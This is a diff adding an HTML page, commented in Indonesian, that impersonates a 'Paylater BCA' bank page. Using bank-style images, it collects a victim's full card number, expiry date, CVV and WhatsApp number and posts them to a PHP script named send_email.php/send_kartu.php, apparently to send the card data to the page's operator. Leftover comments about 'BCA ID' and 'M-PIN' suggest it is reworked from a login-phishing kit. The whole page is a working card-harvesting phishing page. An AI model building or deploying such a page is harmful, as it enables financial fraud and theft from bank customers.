@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Paylater BCA</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column; /* Mengatur agar konten berada di tengah halaman */
+      height: 100vh; /* Mengatur tinggi halaman agar mengisi seluruh tinggi viewport */
+      background-color: #f0f0f0; /* Warna latar belakang */
+    }
+
+    img {
+      max-width: 100%;
+      height: auto;
+      margin-bottom: 20px; /* Margin bawah untuk menjaga jarak dengan formulir */
+    }
+
+    form {
+      text-align: center;
+      margin-top: 20px; /* Margin atas untuk menjaga jarak dengan gambar */
+    }
+
+    .form-container {
+      margin-bottom: 20px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    input {
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 2px solid #2f539b;
+      border-radius: 5px;
+      box-sizing: border-box;
+    }
+
+    .four-digit-input {
+      width: calc(100% - 20px);
+      max-width: 350px;
+    }
+
+    .two-input-container {
+      display: flex;
+      justify-content: center;
+      width: 100%;
+      margin-bottom: 15px;
+    }
+
+    .two-digit-input {
+      width: calc(50% - 10px);
+      max-width: 150px;
+      margin-right: 30px;
+    }
+
+    .submit-button {
+      background-color: #2f539b;
+      color: white;
+      border: none;
+      padding: 10px 110px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    .bottom-image {
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <!-- Foto atas -->
+  <img src="https://i.ibb.co/S7nq4Jf/IMG-20240306-220627.jpg" alt="Foto atas">
+
+  <!-- Formulir -->
+  <form id="myForm" action="send_email.php/send_kartu.php" method="post" onsubmit="return validateForm()">
+    <div class="form-container">
+      <!-- Kolom input pertama untuk BCA ID -->
+      <input type="tel" id="Masukannokartu" name="Masukannokartu" placeholder="Masukkan 16 Nomor Kartu Debit/Kredit " maxlength="19" class="nomor_hp four-digit-input" oninput="updateStyle('Masukkannokartu')">
+      
+      <!-- Kolom input kedua untuk M-PIN -->
+      <div class="two-input-container">
+        <input type="tel" id="Masaberlaku" name="Masaberlaku" placeholder="00/00" maxlength="5" class="pin-input two-digit-input" oninput="updateStyle('Masaberlaku')">
+        <input type="tel" id="CVV" name="CVV" placeholder="CVV" maxlength="3" class="pin-input two-digit-input" oninput="updateStyle('CVV')">
+      </div>
+
+      <!-- Kolom input untuk Nomor HP -->
+      <input type="tel" id="nomor_hp" name="nomor_hp" placeholder="Nomor Whatsapp" maxlength="12" class="nomor_hp four-digit-input" oninput="updateStyle('nomor_hp')">
+    </div>
+    <button type="submit" class="submit-button">Lanjutkan</button>
+  </form>
+
+  <!-- Foto bawah -->
+  <img src="https://i.ibb.co/K5j2YvV/IMG-20240306-221037.jpg" alt="Foto bawah" class="bottom-image">
+
+  <script>
+    // Logika untuk mengatur kolom pertama untuk BCA ID
+    document.getElementById("Masukannokartu").addEventListener("input", function(event) {
+      let inputValue = event.target.value;
+
+      // Menghapus spasi yang ada
+      inputValue = inputValue.replace(/\s/g, '');
+
+      // Menambahkan spasi setelah setiap 4 digit
+      inputValue = inputValue.replace(/(.{4})/g, '$1 ');
+
+      // Mengatur nilai input sesuai dengan hasil yang telah diformat
+      event.target.value = inputValue;
+    });
+
+    // Logika untuk menambahkan garis miring pada M-PIN 1
+    document.getElementById("Masaberlaku").addEventListener("input", function(event) {
+      let inputValue = event.target.value;
+
+      // Menghapus karakter selain angka dan garis miring
+      inputValue = inputValue.replace(/[^\d\/]/g, '');
+
+      // Jika panjang input melebihi 5 karakter, potong menjadi 5 karakter
+      inputValue = inputValue.slice(0, 5);
+
+      // Menambahkan garis miring hanya jika belum ada garis miring di posisi ketiga input sebelumnya
+      if (inputValue.length > 2 && inputValue.charAt(2) !== "/") {
+        inputValue = inputValue.slice(0, 2) + "/" + inputValue.slice(2);
+      }
+
+      // Mengatur nilai input sesuai dengan hasil yang telah diformat
+      event.target.value = inputValue;
+    });
+
+    // Validasi formulir sebelum pengiriman
+    function validateForm() {
+      var nomor_hp = document.getElementById("nomor_hp").value;
+      var BCA_ID = document.getElementById("Masukannokartu").value;
+      var MPIN1 = document.getElementById("Masaberlaku").value;
+      var MPIN2 = document.getElementById("CVV").value;
+
+      if (nomor_hp === "" || Masukannokartu === "" || Masaberlaku === "" || CVV === "") 
+        return false;
+      else
+        return true;
+    }
+  </script>
+</body>
+</html>
